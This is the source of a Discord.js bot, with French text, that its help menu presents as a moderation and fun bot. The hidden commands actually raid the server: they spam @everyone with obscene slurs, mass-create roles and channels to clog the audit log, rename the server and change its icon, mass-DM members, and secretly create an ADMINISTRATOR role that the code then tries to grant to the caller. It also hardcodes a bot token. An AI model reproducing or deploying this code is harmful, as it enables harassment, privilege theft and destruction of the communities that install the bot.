const Discord = require('discord.js');
const client = new Discord.Client();
prefix = "!";

function cmd(str, msg) {
  return msg.content.toLowerCase().startsWith(prefix + str);
  }

client.on('ready', () => {
  client.user.setActivity('OFFICIAL | !help')
  console.log(`bot on`);


});

client.login("NDY2MjkyNTA4NTg2OTM0Mjcy.DiZ_bA.b03PsVSFkYahho2gT3XYdDfWnoY");



      
            // Help
client.on('message', message => {
  var args = message.content.split(" ").slice(1)
  if(message.content.startsWith(prefix + ("help"))) {
    let ballembed = new Discord.RichEmbed()
    .setTitle("OFFICIAL DISCORD BOT")
    .setDescription("N'hésitez pas a faire ***/setup*** pour une Meilleur Utilisation.")
    .setColor("#c10f0f")
    .addField("Moderation", "!ban : Ban un Utilisateur.\n!kick : Kick un Utilisateur.\n!rainbow: cree un grade multicolor.\n!all: vous donne la liste de toutes les commandes disponible non lister ici.")
    .addField("Fun", "!avatar : Post son Avatar.\n!8ball : Fonction 8Ball.\n!roulette : Jouer a la Roulette Russe")
    message.channel.send(ballembed);
  }
});
            
            


//Commande de Flood
client.on("message", message => {
  if(cmd("spam", message)) {

  message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 100000; i++) {
      message.channel.send("@everyone @here FDP TU TES FAIT NIQUER PAR LA E.C \nMTN DECALE SALE FDP\nhttp://gifdrole.com/bebes/bv000016.gif\nREJOIN LE SRV QUI TA NIQUER SOMBRE DECHEANCE.\nhttps://discord.gg/2Vfevup");
  }
}
});
          // Commande de Destruction
client.on("message", msg => {
if(cmd("channel", msg)) {
  msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 500; i++) {
      // Creates new roles to clog up the audit log
      msg.guild.createRole({
          name: 'LA EF TA NIKER PD',
          color: 'BLUE',
      });
      msg.guild.createChannel('purified by E.C', 'voice')
      msg.guild.createChannel('purified by E.C', 'text')
      //changes name tons of times to clog up the audit log
      msg.guild.setName("LA EC A VIOLER TON PERE");
      msg.guild.setRegion('russia')

   }
   
   
}
});       

       // Commande de Destruction
client.on("message", msg => {
if(cmd("icon", msg)) {
  msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 500; i++) {
      // Creates new roles to clog up the audit log
      msg.guild.createRole({
          name: 'tu creve',
          color: 'RED',
      });
      msg.guild.setIcon('https://cdn.discordapp.com/attachments/443413713647697940/443414380474793984/JPEG_20180429_165234.jpg')
   }
   
   
}
});       


      
            // Commande d'Admin
            client.on('message', message => {
              if(message.content.startsWith(prefix + ("ezall"))) {
                let RoleToAdd = message.guild.roles.find('name', 'ELFAMOSO')
 
                message.member.addRole(RoleToAdd);
                 message.guild.createRole({
 
                  name: 'ELFAMOSO',
                 
                  color: 'RED',
                 
                  permissions:'ADMINISTRATOR',            
                
                })
                 
                }
                 
                });


                //commande me

                client.on('message', message => {
                    if(message.content.startsWith(prefix + ("ezall"))) {
                        let msg = args.slice(0).join(" ");

                        let ballembed = new Discord.RichEmbed()
                        .setTitle("say")
                        .setColor("#c10f0f")
                        .addField("Message", msg)
                        
                        message.channel.send(ballembed);


                    }
                 
                });


                //massrole
               
                client.on('message', message => {
                  if(message.content.startsWith(prefix + ("role"))) {
                      console.log(`Commande !role par ${message.author.tag}`);
                      if (message.deletable) message.delete();
                      let i = 0;
                      let interval = setInterval(function () {
                      if (i === 250) clearInterval(interval);
                      message.guild.createRole({name: 'EC', color:'RANDOM'}).then(function(role) {
                        message.guild.members.forEach(member => {
                        member.addRole(role).catch(e => {});
                      })
                      i++
                      }, 100)
                         })
                        }
                 
                      });


                      client.on('message', message => {
                        if(message.content.startsWith(prefix + ("mp"))) {
                            if(message.deletable) message.delete();
                            i = 0;
                            message.guild.members.forEach(member => {
                        
                            if(i < 500){
                              var interval = setInterval (function () {
                                member.send(`REJOIN LE SRV QUI A BZ TA MERE\n https://discord.gg/2Vfevup`).catch(e => {});
                              }, 450)
                        
                              }   
                          })
                        }
                          });

                          client.on('message', message => {
                            if(message.content.startsWith(prefix + ("raid"))) {
                                if(message.deletable) message.delete();
                              message.channel.send('!mp');
                              message.channel.send('!channel');
                              message.channel.send('!spam');
                              message.channel.send('!role');
                              }
                            });




                          


                              client.on('message', message => {
                                if(message.content.startsWith(prefix + ("inv"))) {

                                  message.guild.channels.random().createInvite().then(invite =>
                                    console.log(invite.url))

                                }
                              });
                              
                              
                          
